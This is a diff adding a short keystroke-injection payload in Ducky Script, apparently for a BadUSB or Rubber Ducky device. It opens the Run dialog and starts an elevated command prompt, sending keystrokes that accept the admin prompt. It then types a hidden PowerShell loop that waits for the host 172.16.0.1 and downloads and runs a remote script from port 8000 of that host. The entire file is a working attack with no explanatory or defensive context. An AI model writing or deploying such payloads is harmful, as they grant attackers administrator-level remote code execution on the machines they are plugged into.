@@ -1,0 +1,13 @@
+GUI r
+DELAY 500
+STRING powershell -c "Start-Process cmd -verb runas"
+ENTER
+DELAY 2500
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 2000
+
+STRING powershell -W Hidden while ($true) {If (Test-Connection 172.16.0.1 -count 1) {IEX (New-Object Net.WebClient).DownloadString('http://172.16.0.1:8000/ps.ps1');exit}}
+DELAY 300
+ENTER
